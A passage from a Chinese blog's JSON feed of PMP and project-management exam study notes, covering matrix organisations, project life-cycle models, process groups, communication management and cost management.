矩阵型组织</h3>\n<table>\n<thead>\n<tr>\n<th>项目属性</th>\n<th>弱矩阵</th>\n<th>平衡矩阵</th>\n<th>强矩阵</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>项目经理权利</td>\n<td>有限</td>\n<td>小到中</td>\n<td>中到大</td>\n</tr>\n<tr>\n<td>项目经理角色</td>\n<td>兼职</td>\n<td>全职</td>\n<td>全职</td>\n</tr>\n<tr>\n<td>预算控制者</td>\n<td>职能部门经理</td>\n<td>混合</td>\n<td>项目经理</td>\n</tr>\n<tr>\n<td>项目管理行政人员（文员、资料员等）</td>\n<td>兼职</td>\n<td>兼职</td>\n<td>全职</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>弱矩阵型组织\n<ul>\n<li>兼职项目经理</li>\n<li>权力大小：“小”</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/assets/ruo-ju-zhneg-xing.png\" alt=\"弱矩阵型组织\"></p>\n<ul>\n<li>强矩阵型组织\n<ul>\n<li>全职项目经理</li>\n<li>权力大小：“中”到“大”</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/assets/qiang-ju-zheng-xing.png\" alt=\"强矩阵型组织\"></p>\n<ul>\n<li>平衡矩阵型组织\n<ul>\n<li>兼职项目经理</li>\n<li>权力大小：“小”到“中”</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/assets/ping-heng-ju-zheng-xing.png\" alt=\"平衡矩阵型组织\"></p>\n<h4 id=\"优点-2\" tabindex=\"-1\"> 优点</h4>\n<ul>\n<li>兼有职能型和项目型的优点, 比较灵活</li>\n<li>资源利用率相对较高</li>\n<li>有利于跨部门协调</li>\n</ul>\n<h4 id=\"缺点-2\" tabindex=\"-1\"> 缺点</h4>\n<ul>\n<li>团队成员可能存在多头领导（项目经理和职能经理）</li>\n<li>管理难度大</li>\n<li>资源争夺</li>\n</ul>\n<h2 id=\"项目生命周期\" tabindex=\"-1\"> 项目生命周期</h2>\n<h3 id=\"特征\" tabindex=\"-1\"> 特征</h3>\n<ul>\n<li>成本与人力投入在开始时较低, 在工作执行期间达到最高, 并在项目快要结束时迅速回落</li>\n<li>风险与不确定性在项目开始时最大, 并在项目的整个生命周期随着决策的制定与可交付成果的验收而逐步降低</li>\n<li>做出变更和纠正错误的成本, 随着项目越来越接近完成而显著增高</li>\n</ul>\n<h3 id=\"生命周期模型\" tabindex=\"-1\"> 生命周期模型</h3>\n<h4 id=\"瀑布模型\" tabindex=\"-1\"> 瀑布模型</h4>\n<p>一般将软件开发分为：</p>\n<p>（1）可行性分析（计划）\n（2）需求分析\n（3）软件设计（概要设计、详细设计）\n（4）编码（含单元测试）\n（5）测试\n（6）运行维护</p>\n<h4 id=\"螺旋模型\" tabindex=\"-1\"> 螺旋模型</h4>\n<p>将原型实现的迭代特征与线性顺序（瀑布）模型中控制的和系统化的方面结合起来</p>\n<p>适用于需求不明确、庞大而复杂的、高风险的系统</p>\n<p>阶段任务：</p>\n<p>（1）制定计划\n（2）风险分析\n（3）实施工程\n（4）客户评估</p>\n<h4 id=\"迭代模型\" tabindex=\"-1\"> 迭代模型</h4>\n<p>阶段任务：</p>\n<p>（1）初始阶段\n（2）细化阶段\n（3）构造阶段\n（4）移交阶段</p>\n<h4 id=\"v-模型\" tabindex=\"-1\"> V 模型</h4>\n<p>非常明确的表明了测试过程存在的不同的级别, 并且非常清新的描述了这些测试阶段和开发阶段的对应关系</p>\n<ul>\n<li>单元测试 =&gt; 验证软件单元是否按照单元规格说明（详细设计说明）正确执行</li>\n<li>集成测试 =&gt; 检查多个单元是否按照系统概要设计描述的方式协同工作</li>\n<li>系统测试 =&gt; 验证整个系统是否满足需求规格说明</li>\n<li>验收测试 =&gt; 从用户的角度检查系统是否满足和她中定义的需求或者用户需求</li>\n</ul>\n<h4 id=\"原型化模型\" tabindex=\"-1\"> 原型化模型</h4>\n<p>创建一个快速原型, 能够满足项目干系人与未来的用户可以与原型进行交互, 再通过与相关干系人进行充分的讨论和分析, 最终弄清楚当前系统的需求, 进行了充分的了解之后, 在原型的基础上开发出用户满意的产品</p>\n<h4 id=\"敏捷开发模型\" tabindex=\"-1\"> 敏捷开发模型</h4>\n<p>敏捷开发是一种以人为核心、迭代、循序渐进的开发方法</p>\n<h2 id=\"项目管理过程\" tabindex=\"-1\"> 项目管理过程</h2>\n<h3 id=\"启动过程组\" tabindex=\"-1\"> 启动过程组</h3>\n<p>【整体管理】</p>\n<p>1）制定项目章程</p>\n<p>【干系人管理】</p>\n<p>1）识别干系人</p>\n<h3 id=\"计划过程组\" tabindex=\"-1\"> 计划过程组</h3>\n<p>【整体管理】</p>\n<p>1）制定项目管理计划</p>\n<p>【范围管理】</p>\n<p>1）规划范围管理\n2）所集需求\n3）定义范围\n4）创建 WBS</p>\n<p>【进度管理】</p>\n<p>1）规划进度管理\n2）定义活动\n3）排列活动顺序\n4）估算活动资源\n5）估算活动持续时间\n6）制定进度计划</p>\n<p>【成本管理】</p>\n<p>1）规划成本管理\n2）估算成本\n3）制定预算</p>\n<p>【质量管理】</p>\n<p>1）规划质量管理</p>\n<p>【人力资源管】</p>\n<p>1）规划人力资源管理</p>\n<p>【沟通管理】</p>\n<p>1）规划沟通管理</p>\n<p>【风险管理】</p>\n<p>1）规划风险管理\n2）识别风险\n3）实施定性风险分析\n4）实施定量风险分析\n5）规划风险应对</p>\n<p>【采购管理】</p>\n<p>1）规划采购管理</p>\n<p>【干系人管理】</p>\n<p>1）规划干系人管理</p>\n<h3 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h3>\n<p>【整体管理】</p>\n<p>1）指导与管理项目执行</p>\n<p>【质量管理】</p>\n<p>1）实施质量保证</p>\n<p>【人力资源管理】</p>\n<p>1）构建项目团队\n2）建设项目团队\n2）管理项目团队</p>\n<p>【沟通管理】</p>\n<p>1）管理沟通</p>\n<p>【采购管理】</p>\n<p>1）实施采购</p>\n<p>【干系人管理】</p>\n<p>1）管理干系人</p>\n<h3 id=\"监督与控制过程组\" tabindex=\"-1\"> 监督与控制过程组</h3>\n<p>【整体管理】</p>\n<p>1）监控项目工作\n2）实施整体变更控制</p>\n<p>【范围管理】</p>\n<p>1）确认范围\n2）控制范围</p>\n<p>【成本管理】</p>\n<p>1）控制成本</p>\n<p>【质量管理】</p>\n<p>1）控制质量</p>\n<p>【沟通管理】</p>\n<p>1）控制沟通</p>\n<p>【风险管理】</p>\n<p>1）控制风险</p>\n<p>【采购管理】</p>\n<p>1）控制采购</p>\n<p>【干系人管理】</p>\n<p>1）控制干系人参与</p>\n<h3 id=\"收尾过程组\" tabindex=\"-1\"> 收尾过程组</h3>\n<p>【整体管理】</p>\n<p>1）结束项目或阶段</p>\n<p>【采购管理】</p>\n<p>1）结束采购</p>\n",
      "image": "https://vxhly.github.io/assets/zhi-neng-xing.png",
      "date_published": "2022-07-12T20:00:42.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "信息系统项目管理师"
      ]
    },
    {
      "title": "第一章：引论",
      "url": "https://vxhly.github.io/pmp/knowledge/Introduction.html",
      "id": "https://vxhly.github.io/pmp/knowledge/Introduction.html",
      "summary": "前言\n记录引论章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录引论章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"本章重点\" tabindex=\"-1\"> 本章重点</h2>\n<ul>\n<li>项目的特点：、、渐进明细、促进组织变更、</li>\n<li>“”和“”的区别</li>\n<li></li>\n<li>、、、的特点</li>\n<li>“”和“”的区别</li>\n<li>、、的区别和联系</li>\n<li>很多, 具体以哪些标准来衡量要与相关方达成共识</li>\n</ul>\n<h2 id=\"全书内容\" tabindex=\"-1\"> 全书内容</h2>\n<p>在项目管理中, 流程一般概括为 10 大知识领域、5 大项目管理过程组、49 个过程矩阵, 只要对这些环节牢牢把关, 按计划完成,\n项目就能顺利推进和完成, 接下来通过一张图来呈现它们之间的关系。</p>\n<p><img src=\"/assets/PMP.png\" alt=\"项目沟通管理\"></p>\n<h2 id=\"项目\" tabindex=\"-1\"> 项目</h2>\n<p>项目是为创造独特的产品、服务或成果而进行的临时性工作。</p>\n<p>项目的特点：独特性、临时性、渐近明细、促进组织变更、商业价值。</p>\n<p>项目可以是不包括在项目组合或项目集中的独立项目。</p>\n<p>项目的启动原因：</p>\n<p>（1）符合法规、法律或社会要求\n（2）满足相关方的要求或需求\n（3）创造、改造或修复产品、过程或服务\n（4）执行或变更业务或技术战略</p>\n<h3 id=\"项目的-独特性\" tabindex=\"-1\"> 项目的 “独特性”</h3>\n<p>项目所创造的产品或服务在一定程度或在某些方面与其他的产品和服务相比较, 有明显的差别。</p>\n<p>开展项目是为了通过可交付成果达成目标。</p>\n<p>项目可交付成果和活动可能存在重复的元素, 但这种重复并不会改变项目本质上的独特性。</p>\n<p>独特的可交付成果 =&gt; 必须产出的任何独特并可核实的产品、成果和服务能力（项目当中产生的各类文档和计划也属于可交付成果）。</p>\n<p>需要针对项目的独特性、针对性地收集资料, 制定计划并执行, 确保项目成功。</p>\n<h3 id=\"项目的-临时性\" tabindex=\"-1\"> 项目的 “临时性”</h3>\n<p>项目的 “临时性” =&gt; 项目有明确的起点和终点</p>\n<p>“临时性”并不一定意味着项目的持续时间短</p>\n<p>项目产生的可交付成果不是临时的</p>\n<h3 id=\"项目的-复杂性\" tabindex=\"-1\"> 项目的 ”复杂性“</h3>\n<p>项目的复杂性主要来源于：人类行为、系统行为、模糊性</p>\n<h3 id=\"项目终止\" tabindex=\"-1\"> 项目终止</h3>\n<ul>\n<li>达成项目目标（做完了）</li>\n<li>不会或不能达到目标（做不完）</li>\n<li>项目资金缺乏或没有可分配资金（没钱做了）</li>\n<li>项目需求不复存在（不用做了）</li>\n<li>无法获得所需人力或物力资源（没资源做了）</li>\n<li>法律或便利原因终止（不让做了）</li>\n</ul>\n<h3 id=\"商业价值\" tabindex=\"-1\"> 商业价值</h3>\n<p>项目的“商业价值” =&gt; 项目的成果能够为相关方带来的效益, 效益可以是有形的、无形的或两者兼有之</p>\n<p>有形效益 =&gt; 货币资产、股东权益、固定设施、工具、市场份额</p>\n<p>无形效益 =&gt; 商誉、品牌认知度、公共利益、战略一致性</p>\n<h2 id=\"项目成功的标准\" tabindex=\"-1\"> 项目成功的标准</h2>\n<p>确定项目是否成功, 除了应达到时间、成本、范围和质量等项目管理测量指标外, 还应考虑项目目标的实现情况, 这些项目目标可能包括：</p>\n<ul>\n<li>完成项目效益管理计划；</li>\n<li>达到商业论证中记录的财务指标（NPV、ROI、IRR、PBP、BCR 等）；</li>\n<li>完成组织从“当前状态”转到“将来状态；</li>\n<li>履行合同条款和条件；</li>\n<li>使相关方满意；</li>\n<li>达到组织战略、目的和目标。</li>\n</ul>\n<h2 id=\"项目管理\" tabindex=\"-1\"> 项目管理</h2>\n<p>项目管理 =&gt; 将知识、技能、工具与技术应用于项目活动, 以满足项目的要求</p>\n<p>有效的项目管理可以帮助</p>\n<ul>\n<li>=&gt; 管理制约因素（例如范围、质量、进度、成本、资源）</li>\n<li>=&gt; 平衡制约因素对项目的影响（例如范围扩大可能会增加成本或延长进度）</li>\n</ul>\n<p>项目的关键要素</p>\n<ul>\n<li>项目生命周期</li>\n<li>项目阶段</li>\n<li>阶段关口 =&gt; 阶段关口是项目阶段的一个关键组成部分。在项目的阶段关口, 可能做出相关决定, 以便停留在当前阶段。</li>\n<li>项目管理过程</li>\n<li>5 大过程组（启动过程组、规划过程组、收尾过程组）</li>\n<li>10 大知识领域</li>\n</ul>\n<p>项目管理过程开展频率</p>\n<ul>\n<li>仅开展一次或仅在项目预定义点开展的过程</li>\n<li>根据需要定期开展的过程</li>\n<li>在整个项目期间持续开展的过程</li>\n</ul>\n<h2 id=\"项目集管理\" tabindex=\"-1\"> 项目集管理</h2>\n<div><p>关键词</p>\n<p>相互协调+收益最大化+依赖关系</p>\n</div>\n<div><p>关注点</p>\n<p>关注的是项目之间的协调关系、关联关系</p>\n<p>项目集和项目管理的重点在于以“正确”的方式开展项目集和项目（方式要正确）</p>\n</div>\n<div><p>具体措施</p>\n<p>解决资源制约、处理变更管理、管理风险、分配预算</p>\n</div>\n<p>是一组相互关联且被协调管理的“项目、子项目集和项目集活动”, 以便能获得分别管理所无法获得的利益。</p>\n<p>为了获得更大的效益, 而对一系列相互配套的项目进行协调管理。处理同一个治理结构内的相关问题和变更管理。</p>\n<p>项目集管理住宅作为组成部分的项目与项目集之间的依赖关系, 以确定管理这些项目的最佳方式。</p>\n<h2 id=\"项目组合管理\" tabindex=\"-1\"> 项目组合管理</h2>\n<div><p>关键词</p>\n<p>战略经营目标 + 投资回报最大 + 协调有限的资源 + 价值最大化 + 组织战略</p>\n</div>\n<div><p>关注点</p>\n<p>关注的是项目之间的优先级</p>\n<p>项目组合管理则注重于开展“正确”的项目集和项目（选择要正确）</p>\n</div>\n<div><p>具体措施</p>\n<p>指导组织的投资决策、选择项目集与项目的最佳组合方式、提高实现预期投资回报的可能性</p>\n</div>\n<p>是指为了实现战略目标而组合在一起管理的“项目、项目集、子项目组合和运营工作”, 它们不一定彼此依赖活着相关。</p>\n<p>项目组合中的项目集或项目不一定彼此依赖或者直接相关。关注实现项目组合价值的最大化。</p>\n<p>同一项目组合中的所有项目都服务于同一个战略目标。</p>\n<h2 id=\"组织项目管理\" tabindex=\"-1\"> 组织项目管理</h2>\n<p>组织战略 &gt; 项目组合（阶段决策）&gt; 项目集与项目（成果交付）&gt; 运营（商业价值实现）</p>\n<h2 id=\"运营\" tabindex=\"-1\"> 运营</h2>\n<div><p>关键词</p>\n<p>持续的、重复的、生产同样成果、批量生产</p>\n</div>\n<p>运营 =&gt; 是一种生产重复性结果的持续性工作</p>\n<p>项目往往来自运营, 有服务于运营</p>\n<h2 id=\"项目与运营的异同\" tabindex=\"-1\"> 项目与运营的异同</h2>\n<h3 id=\"相同点\" tabindex=\"-1\"> 相同点</h3>\n<p>（1）都需要人员实施\n（2）都受资源限制\n（3）都需计划、执行和监控</p>\n<h3 id=\"不同点\" tabindex=\"-1\"> 不同点</h3>\n<p>项目：</p>\n<p>（1）一次性创新活动\n（2）达到目标结束\n（3）创造独特成果\n（4）过程充满风险</p>\n<p>运营：</p>\n<p>（1）持续性重复活动\n（2）达到目标开始新目标\n（3）生产同样成果\n（4）风险很少或没有</p>\n<h2 id=\"产品生命周期\" tabindex=\"-1\"> 产品生命周期</h2>\n<p>产品从概念、交付、成才、成熟到衰退的整个演变过程的一系列阶段</p>\n<p>典型的产品生命周期分为：投入期、成长期、成熟期和衰退期</p>\n<h2 id=\"开发生命周期\" tabindex=\"-1\"> 开发生命周期</h2>\n<div><p>提示</p>\n<p>项目生命周期内与（产品、服务或成果的）开发相关的一个或多个阶段。</p>\n</div>\n<table>\n<thead>\n<tr>\n<th>方法</th>\n<th>需求</th>\n<th>活动</th>\n<th>交付</th>\n<th>目标</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>预测型</td>\n<td>固定型</td>\n<td>整个项目执行一次</td>\n<td>一次性交付</td>\n<td>控制成本</td>\n</tr>\n<tr>\n<td>迭代型</td>\n<td>动态的</td>\n<td>反复的, 直到对了</td>\n<td>一次性交付</td>\n<td>解决方案的正确性</td>\n</tr>\n<tr>\n<td>增量型</td>\n<td>动态的</td>\n<td>每个给定的增量, 就执行一次</td>\n<td>多次交付</td>\n<td>速度</td>\n</tr>\n<tr>\n<td>敏捷型</td>\n<td>动态的</td>\n<td>反复, 直到对了</td>\n<td>频繁交付</td>\n<td>通过频繁交付和反馈, 保证客户价值</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"预测型\" tabindex=\"-1\"> 预测型</h3>\n<ul>\n<li>预测型的生命周期又叫瀑布型是计划驱动的</li>\n<li>范围、进度、成本在早期阶段就确定</li>\n<li>按计划执行、一次交付</li>\n<li>充分了解产品、有厚实的行业基础</li>\n<li>需求明确的项目</li>\n</ul>\n<h3 id=\"迭代型\" tabindex=\"-1\"> 迭代型</h3>\n<ul>\n<li>从“模糊”到“清晰”</li>\n<li>迭代方法是通过一系列重复的循环活动来开发产品</li>\n</ul>\n<h3 id=\"增量型\" tabindex=\"-1\"> 增量型</h3>\n<ul>\n<li>从“部分”到“整体”</li>\n<li>只有在最后一次增量之后, 可交付成果具有必要和足够的能力, 才能被视为完整的</li>\n</ul>\n<h3 id=\"适应型\" tabindex=\"-1\"> 适应型</h3>\n<ul>\n<li>适应型又称敏捷型</li>\n<li>应对快速变化, 针对小功能进行迭代</li>\n<li>较小的增量 =&gt; 每次均支付“最有价值”的功能</li>\n<li>快速的迭代 =&gt; 一般 2 ～ 4 周一个迭代</li>\n<li>频繁的交付 =&gt; 相关方频繁参与</li>\n<li>适用于创新的项目 =&gt; 需要快速应对变化</li>\n<li>快速的推向市场</li>\n</ul>\n<h3 id=\"混合型\" tabindex=\"-1\"> 混合型</h3>\n<ul>\n<li>部分保存预测型, 部分使用敏捷型</li>\n</ul>\n<h2 id=\"项目的管理过程\" tabindex=\"-1\"> 项目的管理过程</h2>\n<p>项目生命周期 =&gt; 项目从启动到完成所经历的一系列阶段。这些阶段之间的关系可以顺序、迭代或交叠进行。</p>\n<div><p>成本与人力投入</p>\n<p>项目开始时“缓慢增加”, 在“执行工作”期间达到最高, 项目快结束时“迅速回落”</p>\n</div>\n<div><p>风险与不确定性、相关方的影响力、变更的数量</p>\n<p>项目开始时最大, 后续“逐步降低”</p>\n</div>\n<div><p>变更的代价、风险的影响</p>\n<p>项目开始时较小, 后续“显著增高”</p>\n</div>\n<p>阶段（项目生命周期） =&gt;</p>\n<p>（1）开始项目\n（2）组织与准备\n（3）执行项目工作\n（4）结束项目</p>\n<p>过程组 =&gt;</p>\n<p>（1）启动过程组\n（2）规划过程组\n（3）执行过程组\n（4）监控过程组\n（5）收尾过程组</p>\n<table>\n<thead>\n<tr>\n<th>知识领域/过程组</th>\n<th>启动</th>\n<th>规划</th>\n<th>执行</th>\n<th>监控</th>\n<th>收尾</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>整合</td>\n<td>制定项目章程</td>\n<td>制定项目管理计划</td>\n<td>指导与管理项目工作、管理项目知识</td>\n<td>监控项目工作、实施整体变更控制</td>\n<td>结束项目或阶段</td>\n</tr>\n<tr>\n<td>范围</td>\n<td></td>\n<td>规划范围管理、收集需求、定义范围、创建 WBS</td>\n<td></td>\n<td>确认范围、控制范围</td>\n<td></td>\n</tr>\n<tr>\n<td>进度</td>\n<td></td>\n<td>规划进度管理、定义活动、排列活动顺序、估算活动持续时间、制定进度计划</td>\n<td></td>\n<td>控制进度</td>\n<td></td>\n</tr>\n<tr>\n<td>成本</td>\n<td></td>\n<td>规则成本管理、估算成本、制定预算</td>\n<td></td>\n<td>控制进度</td>\n<td></td>\n</tr>\n<tr>\n<td>质量</td>\n<td></td>\n<td>规划质量管理</td>\n<td>管理质量</td>\n<td>控制质量</td>\n<td></td>\n</tr>\n<tr>\n<td>资源</td>\n<td></td>\n<td>规划资源管理、估算活动资源</td>\n<td>获取资源、建设团队、管理团队</td>\n<td>控制资源</td>\n<td></td>\n</tr>\n<tr>\n<td>沟通</td>\n<td></td>\n<td>规划沟通管理</td>\n<td>管理沟通</td>\n<td>监督沟通</td>\n<td></td>\n</tr>\n<tr>\n<td>风险</td>\n<td></td>\n<td>规划风险管理、识别风险、定性风险分析、定量风险分析、规划风险应对</td>\n<td>实施风险应对</td>\n<td>监督风险</td>\n<td></td>\n</tr>\n<tr>\n<td>采购</td>\n<td></td>\n<td>规划采购管理</td>\n<td>实施采购</td>\n<td>控制采购</td>\n<td></td>\n</tr>\n<tr>\n<td>相关方</td>\n<td>识别相关方</td>\n<td>规划相关方参与</td>\n<td>管理相关方参与</td>\n<td>监督相关方参与</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"项目效益管理计划\" tabindex=\"-1\"> 项目效益管理计划</h2>\n<p>项目, 指对创造、提高和保持项目效益的过程进行定义的书面文件,\n项目效益指为发起组织和项目预期受益方创造价值的行动、行为、产品、服务或成果的结果；项目管理计划会大致描述项目实现效益的方式和时间,\n以及应制定的效益衡量机制</p>\n<p>项目效益管理计划的内容</p>\n<ul>\n<li>目标效益</li>\n<li>战略一致性</li>\n<li>实现效益的时限</li>\n<li>效益责任人</li>\n<li>测量指标</li>\n<li>假设</li>\n<li>风险</li>\n</ul>\n<h3 id=\"工作绩效数据\" tabindex=\"-1\"> 工作绩效数据</h3>\n<p>输出过程组 =&gt; 执行过程组</p>\n<p>定义 =&gt; 收集到的原始观察结果和测量值, 是随着项目执行而实时收集起来的数据</p>\n<h3 id=\"工作绩效信息\" tabindex=\"-1\"> 工作绩效信息</h3>\n<p>输出过程组 =&gt; 监控过程组</p>\n<p>定义 =&gt; 进行整合分析得到的绩效数据,结合相关背景和跨领域关系进行整合分析而得到的绩效数据</p>\n<h3 id=\"工作绩效报告\" tabindex=\"-1\"> 工作绩效报告</h3>\n<p>输出过程组 =&gt; 监控过程组</p>\n<p>定义 =&gt; 为制定决策、提出问题、采取行动或引起关注,而汇编工作绩效信息形成的实物或电子项目文件</p>\n",
      "image": "https://vxhly.github.io/assets/PMP.png",
      "date_published": "2022-07-15T21:50:00.000Z",
      "date_modified": "2022-09-03T08:51:04.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第十章：项目沟通管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-communication-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-communication-management.html",
      "summary": "前言\n记录项目沟通管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目沟通管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>沟通管理就是在合适的时间让合适的人通过合适的方式把合适的信息传达给合适的人, 看似一句无用的话, 但如何选择“合适”的人、“合适”的方式非常考验人, 所以沟通管理能力是项目经理最重要的能力之一。</p>\n</div>\n<p>沟通 =&gt; 通过沟通活动（如会议和演讲）, 或已工作的方式（如电子邮件、社交媒体、项目报告或项目文档）等各种可能的方式来发送或者接收信息。</p>\n<p>沟通活动可按多种维度进行分类, 包括： 内部 / 外部；正式 / 非正式；层级沟通（向上沟通、向下沟通、横向沟通）；官方沟通 /非官方沟通；书面\n/ 口头沟通。</p>\n<p>成功的沟通包括两个部分：</p>\n<ol>\n<li>根据项目及其相关方的需求而制定适当的沟通策略。</li>\n<li>制定沟通管理计划, 确保用各种形式和手段把恰当的信息传递给相关方。</li>\n<li>5C 原则：Correct：正确的语法和拼写； Concise：简洁的表述和无多余字 ；Clear：清晰的目的和表述（适合读者的需要）；Coherent：连贯的思维逻辑；\nControlling：受控的语句和想法承接</li>\n</ol>\n<p>在敏捷或适应型环境中需考虑的因素</p>\n<ol>\n<li>简化团队成员获取信息的通道</li>\n<li>频繁进行团队检查</li>\n<li>让团队成员集中办公</li>\n<li>以透明的方式发布项目工作, 让领导和相关方指导</li>\n<li>定期邀请相关方评审项目工作</li>\n</ol>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-communication-management.png\" alt=\"项目沟通管理\"></p>\n<h2 id=\"如何做好项目沟通管理\" tabindex=\"-1\"> 如何做好项目沟通管理</h2>\n<p><img src=\"/assets/project-communication-management-0.png\" alt=\"项目沟通管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<h3 id=\"规划沟通管理\" tabindex=\"-1\"> 规划沟通管理</h3>\n<p>基于每个相关方或相关方群体的信息需求、可用的组织资产, 以及具体项目的需求, 为项目沟通活动制定恰当的方法和计划的过程。</p>\n<p>作用：根据相关方需求、组织实际条件、项目的情况, 制定合适的项目沟通计划, 使得项目沟通效率高、效果好。</p>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>沟通需求分析 =&gt; 分析沟通需求, 确定项目项目相关方的信息需求, 包括所需信息的类型和格式, 以及信息对相关方的价值。</p>\n<p>沟通技术：会议、网站等各种技术。需要考虑紧迫性、可用性、易用性、敏感性和保密性。</p>\n<p>沟通模型：编码、传递信息、解码、确认已收到（告知收悉）、反馈 / 响应。</p>\n<p>沟通方法：</p>\n<ul>\n<li>互动沟通：在两方或多方之间进行的实时多向信息交换。</li>\n<li>推式沟通：向需要接收信息的特定接收方发送或发布信息。</li>\n<li>拉式沟通：适用于大量复杂信息或大量信息受众的情况。</li>\n</ul>\n<p>沟通管理计划：描述将如何规划, 结果化、执行与监督项目沟通, 以便提供沟通的有效性。信息传递有问题, 一律找沟通管理计划</p>\n<p><img src=\"/assets/project-communication-management-1.png\" alt=\"项目沟通管理-规划沟通管理\"></p>\n<h2 id=\"执行过程组\" tabindex=\"-1\"> 执行过程组</h2>\n<h3 id=\"管理沟通\" tabindex=\"-1\"> 管理沟通</h3>\n<p>执行过程, 实际做沟通的过程, 促进项目团队与相关方之间的有效信息流动。</p>\n<p>管理沟通是确保项目信息及时且恰当地收集、生成、发布、存储、检索、管理、监督和最终处置的过程。主要作用是, 促成项目团队与相关方之间的有效信息流动</p>\n<h4 id=\"itto-1\" tabindex=\"-1\"> ITTO</h4>\n<p>项目报告发布：收集和发布项目信息的行为。虽然工作绩效报告是监控项目工作过程的输出, 但是本过程会编制临时报告、项目演示、博客,\n以及其他类型的信息。</p>\n<p>项目沟通记录：绩效报告、可交付成果的状态、进度进展、产生的成本、演示, 以及相关方需要的其他信息。</p>\n<p><img src=\"/assets/project-communication-management-2.png\" alt=\"项目沟通管理-管理沟通\"></p>\n<h2 id=\"监控过程组\" tabindex=\"-1\"> 监控过程组</h2>\n<h3 id=\"监督沟通\" tabindex=\"-1\"> 监督沟通</h3>\n<p>监督沟通是确保满足项目及其相关方的信息需求的过程。本过程的主要作用是, 按沟通管理计划和相关方参与计划的要求优化信息传递流程。</p>\n<p>项目沟通的影响和结果应该接受认真的评估和监督, 以确保在正确的时间, 通过正确的渠道, 将正确的内容（发送方和接收方对其理解一致）传递给正确的受众。</p>\n<h4 id=\"itto-2\" tabindex=\"-1\"> ITTO</h4>\n<p><img src=\"/assets/project-communication-management-3.png\" alt=\"项目沟通管理-监督沟通\"></p>\n",
      "image": "https://vxhly.github.io/assets/project-communication-management.png",
      "date_published": "2022-08-03T19:40:40.000Z",
      "date_modified": "2022-09-01T15:03:55.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "PMP"
      ]
    },
    {
      "title": "第七章：项目成本管理",
      "url": "https://vxhly.github.io/pmp/knowledge/project-cost-management.html",
      "id": "https://vxhly.github.io/pmp/knowledge/project-cost-management.html",
      "summary": "前言\n记录项目成本管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目成本管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"核心概念\" tabindex=\"-1\"> 核心概念</h2>\n<div><p>提示</p>\n<p>成本管理是指尽量让项目实际进行中的成本控制在预算范围之内, 确保在预算之内完成项目, 主要包括规划成本管理、估算成本、制定预算和控制成本四个过程。</p>\n</div>\n<p>项目成本管理重点关注完成项目活动所需资源的成本, 但同时也应考虑项目决策对项目的产品、服务或成果的使用成本、维护成本和支持成本的影响。</p>\n<p>项目成本管理包括为使项目在批准的预算内完成而对成本进行规划、估算、预算、融资、筹资、管理和控制的各个过程。</p>\n<p>项目成本管理重点关注完成项目活动所需资源的成本, 但同时也应考虑项目决策对项目产品、服务或成果的使用成本、维护成本和支持成本的影响。</p>\n<h3 id=\"成本类型\" tabindex=\"-1\"> 成本类型</h3>\n<ul>\n<li>直接成本 =&gt; 直接可以归属于项目工作的成本</li>\n<li>间接成本 =&gt; 来自一般管理费用科目、或多个项目分摊</li>\n<li>固定成本 =&gt; 不随生产量、工作量或时间的变化而变化的会重复成本</li>\n<li>可变成本 =&gt; 随着生产量、工作量或时间而变的成本, 又称变动成本</li>\n<li>全生命周期成本 =&gt; 在产品经济有效使用期间所发生的与该产品有关的所有成本</li>\n<li>沉没成本 =&gt; 任何已发生的成本, 与是否合理无关。在决定是否继续某个出了问题的项目时, 不应该考虑沉没成本。</li>\n<li>机会成本 =&gt; 因为选择一个项目而放弃另一个项目, 另一项目可能带来的利益</li>\n</ul>\n<h2 id=\"思维导图\" tabindex=\"-1\"> 思维导图</h2>\n<p><img src=\"/assets/project-cost-management.png\" alt=\"项目成本管理\"></p>\n<h2 id=\"项目成本管理流程\" tabindex=\"-1\"> 项目成本管理流程</h2>\n<p>项目成本管理其实就是项目“节流”的过程,\n一般是对项目的资源和费用进行估算、控制和管理.两个方面需要注意：一是在项目运行前要做好预算计划；二是实际花费要有真实、实时的数据反馈。项目管理人员只有对这两种数据进行分析管理,\n项目成本管理才会更加科学和合理, 但有一个误区大家不要踩坑, 项目成本管理 ≠ 越省钱越好。</p>\n<p><img src=\"/assets/project-cost-management-0.png\" alt=\"项目成本管理\"></p>\n<h2 id=\"规划过程组\" tabindex=\"-1\"> 规划过程组</h2>\n<p>成本管理计划无成本, 只是一个描述如何管理成本的指南。</p>\n<h3 id=\"规划成本管理\" tabindex=\"-1\"> 规划成本管理</h3>\n<h4 id=\"itto\" tabindex=\"-1\"> ITTO</h4>\n<p>成本管理计划：描述将如何规划、安排和控制项目成本。</p>\n<p>成本管理计划包含内容：</p>\n<p>（1）计量单位\n（2）准确度\n（3）精确度\n（4）组织程序链接\n（5）组织程序链接\n（6）控制临界值\n（7）绩效测量规划</p>\n<p><img 